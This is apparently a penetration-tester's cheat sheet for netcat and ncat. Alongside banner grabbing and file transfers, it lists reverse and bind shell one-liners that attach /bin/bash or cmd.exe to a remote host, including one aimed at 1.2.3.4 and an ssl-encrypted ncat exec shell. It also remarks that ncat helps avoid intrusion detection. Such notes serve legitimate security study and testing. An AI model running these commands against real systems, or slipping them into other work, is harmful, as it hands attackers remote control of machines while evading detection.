# netcat

 - Download Netcat for Windows \(handy for creating reverse shells and transfering files on windows systems\):  
 \[[https://joncraton.org/blog/46/netcat-for-windows/\]\(https://joncraton.org/blog/46/netcat-for-windows/\)](https://joncraton.org/blog/46/netcat-for-windows/]%28https://joncraton.org/blog/46/netcat-for-windows/%29)

 - Connect to a POP3 mail server  
 \`nc -nv $ip 110\`

 - Listen on TCP/UDP port  
 \`nc -nlvp 4444\`

 - Connect to a netcat port  
 \`nc -nv $ip 4444\`

 - Send a file using netcat  
 \`nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe\`

 - Receive a file using netcat  
 \`nc -nlvp 4444 &gt; incoming.exe\`

 - Some OSs \(OpenBSD\) will use nc.traditional rather than nc so watch out for that...

 whereis nc  
 nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

 /bin/nc.traditional -e /bin/bash 1.2.3.4 4444

 - Create a reverse shell with Ncat using cmd.exe on Windows  
 \`nc.exe -nlvp 4444 -e cmd.exe\`

 or

 \`nc.exe -nv &lt;Remote IP&gt; &lt;Remote Port&gt; -e cmd.exe\`

 - Create a reverse shell with Ncat using bash on Linux  
 \`nc -nv $ip 4444 -e /bin/bash\`

 - Netcat for Banner Grabbing:

 \`echo "" \| nc -nv -w1 &lt;IP Address&gt; &lt;Ports&gt;\`

 → Ncat - Netcat for Nmap project which provides more security avoid  
 IDS

 - Reverse shell from windows using cmd.exe using ssl  
 \`ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl\`

 - Listen on port 4444 using ssl  
 \`ncat -v $ip 4444 --ssl\`

